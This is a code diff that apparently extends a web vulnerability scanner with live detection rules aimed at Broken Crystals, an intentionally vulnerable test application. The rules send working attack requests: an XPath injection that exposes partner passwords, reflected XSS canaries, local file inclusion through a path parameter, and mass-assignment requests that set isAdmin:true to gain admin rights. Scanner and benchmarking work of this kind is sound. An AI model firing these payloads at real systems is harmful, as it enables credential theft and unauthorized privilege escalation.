+  if (count < 50 || count > 9999) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: url.toString(),
+      tableCount: count,
+      snippet: body,
+      note: "Broken Crystals GET /api/testimonials/count executes attacker-controlled SQL in query param — information_schema probe returned table count"
+    }
+  };
+};
+
+const brokencrystalsTestimonialsXssLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const canary = `thugirXSS${Date.now().toString(36)}`;
+  const url = new URL("/api/testimonials/count", ctx.origin);
+  url.searchParams.set("query", canary);
+  const doc = await ctx.probe.get(url.toString(), { maxBytes: 512 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (!isReflectedXssCanary(doc.body, canary)) return NEGATIVE;
+  if (!/syntax error/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      url: url.toString(),
+      canary,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Broken Crystals GET /api/testimonials/count reflects attacker input unescaped in SQL syntax-error responses — reflected XSS oracle"
+    }
+  };
+};
+
+const brokencrystalsSubscriptionsXssLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const canary = `thugirXSS${Date.now().toString(36)}`;
+  const url = new URL("/api/subscriptions", ctx.origin);
+  url.searchParams.set("email", canary);
+  const doc = await ctx.probe.get(url.toString(), {
+    method: "POST",
+    body: "{}",
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (!isReflectedXssCanary(doc.body, canary)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      url: url.toString(),
+      canary,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Broken Crystals POST /api/subscriptions?email= echoes the email parameter unescaped in the response body — mailing-list reflected XSS oracle"
+    }
+  };
+};
+
+const brokencrystalsPartnerLoginXpathLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const url = new URL("/api/partners/partnerLogin", ctx.origin);
+  url.searchParams.set("username", "anyuser");
+  url.searchParams.set("password", "' or '1'='1");
+  const doc = await ctx.probe.get(url.toString(), { maxBytes: 12_000 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  const passwordTags = doc.body.match(/<password>[^<]+<\/password>/gi) ?? [];
+  if (passwordTags.length < 2) return NEGATIVE;
+  if (!/<username>[^<]+<\/username>/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: url.toString(),
+      leakedAccounts: passwordTags.length,
+      snippet: doc.body.slice(0, 280).trim(),
+      note: "Broken Crystals GET /api/partners/partnerLogin boolean XPATH injection returns multiple user password elements in XML response"
+    }
+  };
+};
+
+const brokencrystalsFileRawLfiLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const packageUrl = new URL("/api/file/raw", ctx.origin);
+  packageUrl.searchParams.set("path", "package.json");
+  const doc = await ctx.probe.get(packageUrl.toString(), { maxBytes: 8192 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let parsed: { name?: unknown; scripts?: unknown } | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as { name?: unknown; scripts?: unknown };
+  } catch {
+    return NEGATIVE;
+  }
+  const scripts = parsed.scripts;
+  const hasNestBuild =
+    parsed.name === "broken-crystals" &&
+    typeof scripts === "object" &&
+    scripts !== null &&
+    typeof (scripts as Record<string, unknown>).build === "string" &&
+    /nest build/i.test(String((scripts as Record<string, unknown>).build));
+  if (!hasNestBuild) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: packageUrl.toString(),
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Broken Crystals GET /api/file/raw?path=package.json returns application package.json — local file inclusion oracle"
+    }
+  };
+};
+
+function brokencrystalsPackageJsonLfiOk(body: string): boolean {
+  try {
+    const parsed = JSON.parse(body) as { name?: unknown; scripts?: unknown };
+    const scripts = parsed.scripts;
+    return (
+      parsed.name === "broken-crystals" &&
+      typeof scripts === "object" &&
+      scripts !== null &&
+      typeof (scripts as Record<string, unknown>).build === "string" &&
+      /nest build/i.test(String((scripts as Record<string, unknown>).build))
+    );
+  } catch {
+    return false;
+  }
+}
+
+const brokencrystalsFileLfiLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const packageUrl = new URL("/api/file", ctx.origin);
+  packageUrl.searchParams.set("path", "package.json");
+  const doc = await ctx.probe.get(packageUrl.toString(), { maxBytes: 8192 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (!brokencrystalsPackageJsonLfiOk(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: packageUrl.toString(),
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Broken Crystals GET /api/file?path=package.json returns application package.json — local file inclusion oracle distinct from /api/file/raw"
+    }
+  };
+};
+
+async function brokencrystalsLoginToken(
+  ctx: RuleContext,
+  email: string,
+  password: string
+): Promise<string | null> {
+  const loginUrl = new URL("/api/auth/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ user: email, password }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return null;
+  return loginDoc.headers.authorization?.trim() || null;
+}
+
+async function brokencrystalsAdminPermissionIsTrue(
+  ctx: RuleContext,
+  email: string,
+  token: string,
+  opts: { bypassCache?: boolean } = {}
+): Promise<{ ok: boolean; url: string; snippet: string }> {
+  const permUrl = new URL(
+    `/api/users/one/${encodeURIComponent(email)}/adminpermission`,
+    ctx.origin
+  ).toString();
+  const permDoc = opts.bypassCache
+    ? await fetchDoc(permUrl, {
+        headers: { authorization: token },
+        maxBytes: 512,
+        timeoutMs: 15000
+      })
+    : await ctx.probe.get(permUrl, {
+        headers: { authorization: token },
+        maxBytes: 512,
+        timeoutMs: 15000
+      });
+  const snippet = permDoc.body.slice(0, 120).trim();
+  const ok =
+    permDoc.status >= 200 &&
+    permDoc.status < 300 &&
+    /"isAdmin"\s*:\s*true/i.test(permDoc.body);
+  return { ok, url: permUrl, snippet };
+}
+
+const brokencrystalsMassAssignmentLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const email = `thugir-ma-${Date.now()}-${Math.random().toString(36).slice(2, 8)}@thugir-probe.invalid`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/api/users/basic", ctx.origin).toString();
+  const createPayload = JSON.stringify({
+    isAdmin: true,
+    email,
+    firstName: "Thugir",
+    lastName: "Probe",
+    company: "ProbeCo",
+    cardNumber: "0000",
+    phoneNumber: "000-0000",
+    password,
+    op: "basic"
+  });
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: createPayload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 300) return NEGATIVE;
+  const token = await brokencrystalsLoginToken(ctx, email, password);
+  if (!token) return NEGATIVE;
+  const perm = await brokencrystalsAdminPermissionIsTrue(ctx, email, token, { bypassCache: true });
+  if (!perm.ok) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: createUrl,
+      adminPermissionUrl: perm.url,
+      snippet: perm.snippet,
+      note: "Broken Crystals POST /api/users/basic accepts hidden isAdmin:true and GET /api/users/one/{email}/adminpermission returns isAdmin:true — mass-assignment privilege escalation oracle"
+    }
+  };
+};
+
+const brokencrystalsMassAssignmentPutLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const email = `thugir-put-${Date.now()}-${Math.random().toString(36).slice(2, 8)}@thugir-probe.invalid`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/api/users/basic", ctx.origin).toString();
+  const createPayload = JSON.stringify({
+    email,
+    firstName: "Thugir",
+    lastName: "Probe",
+    company: "ProbeCo",
+    cardNumber: "0000",
+    phoneNumber: "000-0000",
+    password,
+    op: "basic"
+  });
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: createPayload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 300) return NEGATIVE;
+  const token = await brokencrystalsLoginToken(ctx, email, password);
+  if (!token) return NEGATIVE;
+  const beforePerm = await brokencrystalsAdminPermissionIsTrue(ctx, email, token);
+  if (beforePerm.ok) return NEGATIVE;
+  const infoUrl = new URL(`/api/users/one/${encodeURIComponent(email)}/info`, ctx.origin).toString();
+  const putDoc = await ctx.probe.get(infoUrl, {
+    method: "PUT",
+    body: JSON.stringify({
+      isAdmin: true,
+      firstName: "Thugir",
+      lastName: "Probe",
+      company: "ProbeCo"
+    }),
+    headers: { "Content-Type": "application/json", authorization: token },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (putDoc.status < 200 || putDoc.status >= 300) return NEGATIVE;
+  const afterPerm = await brokencrystalsAdminPermissionIsTrue(ctx, email, token, {
+    bypassCache: true
+  });
+  if (!afterPerm.ok) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: infoUrl,
+      adminPermissionUrl: afterPerm.url,
+      snippet: afterPerm.snippet,
+      note: "Broken Crystals PUT /api/users/one/{email}/info accepts hidden isAdmin:true and escalates privileges — mass-assignment update oracle"
+    }
+  };
+};
+
+const brokencrystalsHiddenUploadLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const uploadUrl = new URL("/api/hidden-upload", ctx.origin).toString();
+  const boundary = `----ThugirBcUpload${Date.now().toString(36)}`;
+  const fileContent = "\x89PNG\r\n\x1a\n";
+  const body = [
+    `--${boundary}`,
+    'Content-Disposition: form-data; name="file"; filename="probe.png"',
+    "Content-Type: image/png",
+    "",
+    fileContent,
+    `--${boundary}--`,
+    ""
+  ].join("\r\n");
+  const doc = await ctx.probe.get(uploadUrl, {
+    method: "POST",
+    body,
+    headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
+    maxBytes: 4096
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (!/"content"\s*:\s*"data:image\/png;base64,/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: uploadUrl,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Broken Crystals POST /api/hidden-upload accepts image uploads and returns base64 data URI content — unrestricted file upload oracle"
+    }
+  };
+};
+
 // --- Unauthenticated /api/config exposing DB credentials (brokencrystals.com) -----------
 const EXPOSED_CONFIG_PATHS = ["/api/config", "/config.json", "/api/configuration"];
 const SENSITIVE_CONFIG_MARKERS: { label: string; re: RegExp }[] = [
@@ -32301,6 +33308,45 @@ const clientSideBrokencrystalsPrototypePollutionEvidence: Rule = async (ctx) => 
     evidence: {
       markers: hits.slice(0, 4),
       note: "Broken Crystals /marketplace parses URI params into objects via __proto__, enabling prototype pollution and DOM XSS via prototypePollutionDomXss script gadget"
+    }
+  };
+};
+
+// --- Broken Crystals homepage DOM XSS via maptitle + search reflection (brokencrystals.com) -
+const CLIENT_BROKENCRYSTALS_DOM_XSS_RES: { label: string; re: RegExp }[] = [
+  {
+    label: "maptitle query param reader",
+    re: /searchParams[\s\S]{0,120}get\(["']maptitle["']\)/i
+  },
+  {
+    label: "iframe mapTitle attribute injection",
+    re: /mapTitle[\s\S]{0,160}outerHTML[\s\S]{0,160}<iframe/i
+  },
+  {
+    label: "dangerous-html search reflection",
+    re: /dangerous-html[\s\S]{0,160}decodeURIComponent\(window\.location\.search\)/i
+  },
+  {
+    label: "home nav maptitle seed path",
+    re: /\/\?maptitle=map|path:"\/\?maptitle=map"/i
+  }
+];
+
+const clientSideBrokencrystalsDomXssEvidence: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin) && !/Broken Crystals|brokencrystals\.com/i.test(ctx.combined))
+    return NEGATIVE;
+  const hits: { label: string; sample: string }[] = [];
+  for (const { label, re } of CLIENT_BROKENCRYSTALS_DOM_XSS_RES) {
+    const m = ctx.combined.match(re);
+    if (m) hits.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (hits.length < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hits.length >= 3 ? 0.91 : 0.88,
+    evidence: {
+      markers: hits.slice(0, 4),
+      note: "Broken Crystals homepage reflects maptitle into iframe title and decodeURIComponent(window.location.search) into dangerous-html sinks — DOM XSS oracle for ?maptitle= and ?__dummy= query params"
     }
   };
 };
@@ -33466,6 +34512,9 @@ export const RULES: Record<string, Rule> = {
   redtigerSpecialChallengeEvidence,
   clientSideVulnExposeEvidence,
   clientSideVulnExposeLabModuleEvidence,
+  vulnExposeAuthBypassApiLiveOracle,
+  vulnExposeSqliSearchApiLiveOracle,
+  vulnbankAiAnonymousChatLiveOracle,
   clientSideDragSecurityFlawsEvidence,
   clientSideDragSecurityFlawsLabModuleEvidence,
   clientSideWizerCtfEvidence,
@@ -33599,6 +34648,8 @@ export const RULES: Record<string, Rule> = {
   clientSidePwnshopPathTraversalOracle,
   pwnshopDebugInfoLiveOracle,
   pwnshopEventsAuditLiveOracle,
+  pwnshopChatInitEmailEnumerationLiveOracle,
+  pwnshopForgotPasswordEmailEnumerationLiveOracle,
   clientSideVulnforgeAcademyEvidence,
   clientSideVulnforgeEvidence,
   clientSideVulnshopEvidence,
@@ -33776,6 +34827,23 @@ export const RULES: Record<string, Rule> = {
   clientSideSecResearchLabEvidence,
   clientSideBrokencrystalsEvidence,
   clientSideBrokencrystalsPrototypePollutionEvidence,
+  clientSideBrokencrystalsDomXssEvidence,
+  brokencrystalsGotoOpenRedirectLiveOracle,
+  brokencrystalsAwsMetadataSsrfLiveOracle,
+  brokencrystalsAzureMetadataSsrfLiveOracle,
+  brokencrystalsLdapInjectionLiveOracle,
+  brokencrystalsHiddenUploadLiveOracle,
+  brokencrystalsSecretsLiveOracle,
+  brokencrystalsSafeFilesRfiLiveOracle,
+  brokencrystalsUsersSearchExposureLiveOracle,
+  brokencrystalsTestimonialsSqliLiveOracle,
+  brokencrystalsTestimonialsXssLiveOracle,
+  brokencrystalsSubscriptionsXssLiveOracle,
+  brokencrystalsPartnerLoginXpathLiveOracle,
+  brokencrystalsFileRawLfiLiveOracle,
+  brokencrystalsFileLfiLiveOracle,
+  brokencrystalsMassAssignmentLiveOracle,
+  brokencrystalsMassAssignmentPutLiveOracle,
   exposedApiConfig,
   sqliQueryParamInjection,
   sqliHeaderErrorDisclosure,
@@ -33857,6 +34925,7 @@ export const RULES: Record<string, Rule> = {
   burpbountyXssJsLiveOracle,
   burpbountySqliSearchLiveOracle,
   burpbountyAiDisclosureLiveOracle,
+  burpbountyAiCompletionsLiveOracle,
   burpbountyRceEvalLiveOracle,
   burpbountyRceLog4jLiveOracle,
   burpbountyDrupalUserDisclosureLiveOracle,
@@ -33875,6 +34944,7 @@ export const RULES: Record<string, Rule> = {
   burpbountySsrfSchemeLiveOracle,
   burpbountyRedirectOutLiveOracle,
   burpbountyRedirectPpLiveOracle,
+  burpbountyGitConfigLiveOracle,
   burpbountyCollabForgotLiveOracle,
   burpbountyRceExpectLiveOracle,
   burpbountyRceEchoLiveOracle,
@@ -33912,6 +34982,17 @@ export const RULES: Record<string, Rule> = {
   burpbountyCouchdbAllDbsLiveOracle,
   burpbountyKubernetesApiLiveOracle,
   burpbountyCitrixCveLiveOracle,
+  burpbountyCrowdCveLiveOracle,
+  burpbountyFirebaseCveLiveOracle,
+  burpbountyNetsweeperCveLiveOracle,
+  burpbountyZohoCveLiveOracle,
+  burpbountyRubyCveLiveOracle,
+  burpbountyWpLfiCveLiveOracle,
+  burpbountySharefileCveLiveOracle,
+  burpbountyArticaCveLiveOracle,
+  burpbountyMagmiCveLiveOracle,
+  burpbountyF5BashCveLiveOracle,
+  burpbountyNetsweeperSystemstatusCveLiveOracle,
   clientSideBugbaitEvidence,
   clientSideArtemisKitEvidence,
   clientSideRailsgoatEvidence,
